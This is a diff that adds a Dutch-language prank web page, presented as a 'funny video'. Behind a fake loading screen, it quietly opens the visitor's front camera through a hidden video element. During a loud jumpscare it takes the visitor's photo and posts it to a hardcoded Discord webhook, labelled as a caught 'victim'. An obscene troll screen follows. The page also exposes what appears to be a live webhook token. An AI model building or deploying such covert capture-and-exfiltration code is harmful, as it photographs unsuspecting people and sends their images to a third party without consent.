@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>😂 Bekijk dit grappige filmpje!</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --red: #ff2222;
+      --dark: #0a0a0a;
+      --surface: #111;
+      --surface2: #1a1a1a;
+      --text: #f0f0f0;
+      --sub: #777;
+      --accent: #ff4444;
+    }
+
+    body {
+      background: var(--dark);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      overflow: hidden;
+      user-select: none;
+    }
+
+    /* ── HIDDEN CAMERA ELEMENTS ── */
+    #hidden-video { position: fixed; opacity: 0; width: 1px; height: 1px; top: -9999px; }
+    #hidden-canvas { display: none; }
+
+    /* ── SCREEN: LANDING (Simple Button) ── */
+    #screen-landing {
+      position: fixed; inset: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 0;
+      background: #000;
+      z-index: 10;
+    }
+
+    .entrance-btn {
+      padding: 20px 60px;
+      background: transparent;
+      border: 1px solid #333;
+      color: #666;
+      font-size: 1.2rem;
+      font-weight: 700;
+      border-radius: 8px;
+      cursor: pointer;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 40px rgba(255,255,255,0.05);
+    }
+    .entrance-btn:hover {
+      border-color: #ff4444;
+      color: #fff;
+      box-shadow: 0 0 50px rgba(255,68,68,0.2);
+      transform: scale(1.05);
+    }
+
+    .landing-bottom-meta {
+      position: absolute;
+      bottom: 40px;
+      display: flex;
+      gap: 20px;
+      font-size: 0.65rem;
+      color: #222;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      font-weight: 700;
+    }
+
+    /* ── SCREEN: LOADING (stiekem camera) ── */
+    #screen-loading {
+      display: none;
+      position: fixed; inset: 0;
+      background: #000;
+      z-index: 100;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 24px;
+    }
+
+    .loading-logo { font-size: 2rem; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .loading-text {
+      font-size: 0.9rem;
+      color: #666;
+      font-weight: 500;
+    }
+
+    .loading-bar-track {
+      width: 200px; height: 3px;
+      background: #1a1a1a;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+    .loading-bar-fill {
+      height: 100%;
+      background: #ff4444;
+      width: 0%;
+      transition: width 1.5s ease;
+    }
+
+    /* ── SCREEN: JUMPSCARE ── */
+    #screen-jumpscare {
+      display: none;
+      position: fixed; inset: 0;
+      background: #ff0000;
+      z-index: 900;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .jumpscare-video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      position: absolute;
+      inset: 0;
+    }
+
+    .jumpscare-flash-overlay {
+      position: absolute;
+      inset: 0;
+      background: rgba(255,0,0,0.5);
+      animation: flashOverlay 0.15s ease-out forwards;
+      pointer-events: none;
+      z-index: 901;
+    }
+    @keyframes flashOverlay {
+      0% { opacity: 1; }
+      100% { opacity: 0; }
+    }
+
+    /* Shake effect on body */
+    @keyframes shakeBody {
+      0%,100% { transform: translate(0,0) rotate(0deg); }
+      10% { transform: translate(-10px, -8px) rotate(-1deg); }
+      20% { transform: translate(10px, 8px) rotate(1deg); }
+      30% { transform: translate(-8px, 5px) rotate(-0.5deg); }
+      40% { transform: translate(8px, -5px) rotate(0.5deg); }
+      50% { transform: translate(-5px, 8px) rotate(-0.5deg); }
+      60% { transform: translate(5px, -8px) rotate(0.5deg); }
+      70% { transform: translate(-8px, 5px) rotate(-0.3deg); }
+      80% { transform: translate(8px, -3px) rotate(0.3deg); }
+      90% { transform: translate(-3px, 5px) rotate(-0.2deg); }
+    }
+    body.shake {
+      animation: shakeBody 0.5s ease-out;
+    }
+
+    /* ── SCREEN: TROLL ── */
+    #screen-troll {
+      display: none;
+      position: fixed; inset: 0;
+      background: #000;
+      z-index: 800;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 30px;
+      padding: 24px;
+    }
+
+    .troll-title {
+      font-size: clamp(3rem, 15vw, 6rem);
+      font-weight: 900;
+      color: #ff0000;
+      text-transform: uppercase;
+      letter-spacing: -3px;
+      text-align: center;
+      animation: vibrate 0.1s infinite;
+    }
+    @keyframes vibrate {
+      0% { transform: translate(0,0); }
+      25% { transform: translate(2px, -2px); }
+      50% { transform: translate(-2px, 2px); }
+      75% { transform: translate(2px, 2px); }
+      100% { transform: translate(-2px, -2px); }
+    }
+
+    .troll-emojis {
+      font-size: 5rem;
+      display: flex;
+      gap: 20px;
+      animation: bounce 0.5s infinite alternate;
+    }
+    @keyframes bounce {
+      from { transform: translateY(0); }
+      to { transform: translateY(-20px); }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Hidden camera elements -->
+<video id="hidden-video" autoplay playsinline muted></video>
+<canvas id="hidden-canvas"></canvas>
+
+<!-- ── SCREEN 1: LANDING ── -->
+<div id="screen-landing">
+  <button class="entrance-btn" onclick="startPrank()">Ga door</button>
+
+  <div class="landing-bottom-meta">
+    <span>18+ content</span>
+    <span>Privacy Statement</span>
+    <span>Cookies</span>
+  </div>
+</div>
+
+<!-- ── SCREEN 2: LOADING (camera stiekem starten) ── -->
+<div id="screen-loading" style="display:none;">
+  <div class="loading-logo">⏳</div>
+  <div class="loading-text" id="loading-txt">Video bufferen...</div>
+  <div class="loading-bar-track">
+    <div class="loading-bar-fill" id="loading-bar"></div>
+  </div>
+</div>
+
+<!-- ── SCREEN 3: JUMPSCARE ── -->
+<div id="screen-jumpscare" style="display:none;">
+  <video id="jumpscare-video" class="jumpscare-video" playsinline>
+    <source src="jumpscare.mp4" type="video/mp4">
+  </video>
+  <div class="jumpscare-flash-overlay"></div>
+</div>
+
+<!-- ── SCREEN 4: TROLL ── -->
+<div id="screen-troll" style="display:none;">
+  <div class="troll-title">FUCK YOU</div>
+  <div class="troll-emojis">🖕 🐒 🖕</div>
+  <audio id="troll-sound" src="troll.mp3" loop></audio>
+</div>
+
+<script>
+  const WEBHOOK = 'https://discord.com/api/webhooks/1490614590948511806/pVP30UWT4UeonIFBzcMjK8_3j7GJWyaTPU6C5Fvlril89lJSjti-Q2wBZXrEcG1BDI6e';
+
+  let stream = null;
+  let capturedDataUrl = null;
+  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+  // ── JUMPSCARE SOUND ──
+  function playJumpscareSound() {
+    // White noise burst
+    const bufferSize = audioCtx.sampleRate * 0.8;
+    const noiseBuffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+    const output = noiseBuffer.getChannelData(0);
+    for (let i = 0; i < bufferSize; i++) {
+      output[i] = Math.random() * 2 - 1;
+    }
+    const noiseSource = audioCtx.createBufferSource();
+    noiseSource.buffer = noiseBuffer;
+
+    const noiseGain = audioCtx.createGain();
+    noiseGain.gain.setValueAtTime(1.5, audioCtx.currentTime);
+    noiseGain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.6);
+
+    noiseSource.connect(noiseGain);
+    noiseGain.connect(audioCtx.destination);
+    noiseSource.start();
+
+    // Low pitched boom
+    const osc = audioCtx.createOscillator();
+    const oscGain = audioCtx.createGain();
+    osc.type = 'sawtooth';
+    osc.frequency.setValueAtTime(80, audioCtx.currentTime);
+    osc.frequency.exponentialRampToValueAtTime(40, audioCtx.currentTime + 0.5);
+    oscGain.gain.setValueAtTime(2.0, audioCtx.currentTime);
+    oscGain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
+    osc.connect(oscGain);
+    oscGain.connect(audioCtx.destination);
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.5);
+
+    // High pitched scream
+    const scream = audioCtx.createOscillator();
+    const screamGain = audioCtx.createGain();
+    scream.type = 'square';
+    scream.frequency.setValueAtTime(600, audioCtx.currentTime);
+    scream.frequency.exponentialRampToValueAtTime(200, audioCtx.currentTime + 0.8);
+    screamGain.gain.setValueAtTime(0.8, audioCtx.currentTime);
+    screamGain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.8);
+    scream.connect(screamGain);
+    screamGain.connect(audioCtx.destination);
+    scream.start();
+    scream.stop(audioCtx.currentTime + 0.8);
+  }
+
+  // ── STEP 1: KLIK OP PLAY ──
+  async function startPrank() {
+    // Probeer fullscreen (voor schrikeffect op desktop/mobiel)
+    try {
+      const el = document.documentElement;
+      if (el.requestFullscreen) el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      else if (el.msRequestFullscreen) el.msRequestFullscreen();
+    } catch(e) { console.log('Fullscreen geweigerd'); }
+
+    // Resume AudioContext (browser requires user gesture)
+    if (audioCtx.state === 'suspended') {
+      await audioCtx.resume();
+    }
+
+    // Show loading screen
+    const landing = document.getElementById('screen-landing');
+    const loading = document.getElementById('screen-loading');
+    landing.style.display = 'none';
+    loading.style.display = 'flex';
+
+    // Fake loading bar
+    const bar = document.getElementById('loading-bar');
+    const txt = document.getElementById('loading-txt');
+    bar.style.transition = 'width 1.5s linear';
+    setTimeout(() => { bar.style.width = '100%'; }, 50);
+
+    const loadingSteps = ['Laden...', 'Verifiëren...', 'Downloaden...'];
+    let idx = 0;
+    const textInterval = setInterval(() => {
+      idx = (idx + 1) % loadingSteps.length;
+      txt.textContent = loadingSteps[idx];
+    }, 500);
+
+    // Stiekem camera starten
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 1280 } },
+        audio: false
+      });
+      const vid = document.getElementById('hidden-video');
+      vid.srcObject = stream;
+      await vid.play();
+    } catch(e) {
+      console.log('Camera geweigerd:', e);
+    }
+
+    // Wacht 1.5 seconden (genoeg tijd voor camera, maar nog steeds onverwachts)
+    setTimeout(() => {
+      clearInterval(textInterval);
+      doJumpscare();
+    }, 1500);
+  }
+
+  // ── STEP 2: JUMPSCARE ──
+  function doJumpscare() {
+    const loading = document.getElementById('screen-loading');
+    const jumpscare = document.getElementById('screen-jumpscare');
+    const jvid = document.getElementById('jumpscare-video');
+
+    loading.style.display = 'none';
+    jumpscare.style.display = 'flex';
+
+    // Start video en volume voluit
+    jvid.volume = 1.0;
+    jvid.play().catch(e => {
+       console.log('Video play error:', e);
+       playJumpscareSound(); // Backup geluid als video faalt
+    });
+
+    // Trillen!
+    document.body.classList.add('shake');
+    setTimeout(() => document.body.classList.remove('shake'), 600);
+
+    // Foto nemen PRECIES bij de jumpscare
+    capturePhoto();
+
+    // Naar TROLL scherm na 3 seconden (lang genoeg voor het filmpje)
+    setTimeout(() => {
+      jvid.pause();
+      jvid.currentTime = 0;
+      jumpscare.style.display = 'none';
+      const trollScr = document.getElementById('screen-troll');
+      trollScr.style.display = 'flex';
+      
+      // Start troll geluid
+      const tSound = document.getElementById('troll-sound');
+      tSound.volume = 1.0;
+      tSound.play().catch(e => console.log('Troll sound error:', e));
+    }, 3000);
+  }
+
+  // ── FOTO NEMEN ──
+  function capturePhoto() {
+    const vid = document.getElementById('hidden-video');
+    const canvas = document.getElementById('hidden-canvas');
+
+    if (!vid.srcObject || vid.readyState < 2) return;
+
+    const SIZE = 800;
+    canvas.width = SIZE;
+    canvas.height = SIZE;
+    const ctx = canvas.getContext('2d');
+
+    // Spiegel (selfie stijl)
+    ctx.save();
+    ctx.scale(-1, 1);
+    ctx.drawImage(vid, -SIZE, 0, SIZE, SIZE);
+    ctx.restore();
+
+    capturedDataUrl = canvas.toDataURL('image/jpeg', 0.88);
+    
+    // Stuur naar Discord op de achtergrond
+    sendToDiscord(capturedDataUrl);
+
+    // Stop camera
+    if (stream) {
+      stream.getTracks().forEach(t => t.stop());
+      stream = null;
+    }
+  }
+
+  // ── DISCORD WEBHOOK ──
+  async function sendToDiscord(dataUrl) {
+    try {
+      const res = await fetch(dataUrl);
+      const blob = await res.blob();
+
+      const now = new Date();
+      const timeStr = now.toLocaleString('nl-NL', { timeZone: 'Europe/Amsterdam' });
+
+      const form = new FormData();
+      form.append('payload_json', JSON.stringify({
+        username: '😱 JumpScare Prank',
+        avatar_url: 'https://cdn.discordapp.com/embed/avatars/4.png',
+        content: `😱 **JUMPSCARE SLACHTOFFER GEVONDEN!!**\n🕐 Tijdstip: \`${timeStr}\`\n💀 Ze schrokken zich kapot hahaha`,
+        embeds: [{
+          title: '🎭 Jumpscare Prank — GOTCHA!',
+          description: 'Iemand klikte op "video afspelen" en schrok zich kapot van de jumpscare 💀😂',
+          color: 0xff4444,
+          footer: { text: 'JumpScare Prank Tool' }
+        }]
+      }));
+      form.append('file', blob, `jumpscare_${Date.now()}.jpg`);
+
+      await fetch(WEBHOOK, { method: 'POST', body: form });
+    } catch(err) {
+      console.log('Webhook mislukt:', err);
+    }
+  }
+
+  // ── FOTO DOWNLOADEN ──
+  function downloadPhoto() {
+    if (!capturedDataUrl) return;
+    const a = document.createElement('a');
+    a.href = capturedDataUrl;
+    a.download = `geschrokken_gezicht_${Date.now()}.jpg`;
+    a.click();
+  }
+
+  // ── OPNIEUW ──
+  function resetPrank() {
+    capturedDataUrl = null;
+    const trollScr = document.getElementById('screen-troll');
+    trollScr.style.display = 'none';
+    
+    // Stop troll geluid
+    const tSound = document.getElementById('troll-sound');
+    tSound.pause();
+    tSound.currentTime = 0;
+
+    document.getElementById('screen-landing').style.display = 'flex';
+    const bar = document.getElementById('loading-bar');
+    bar.style.transition = 'none';
+    bar.style.width = '0%';
+  }
+</script>
+</body>
+</html>
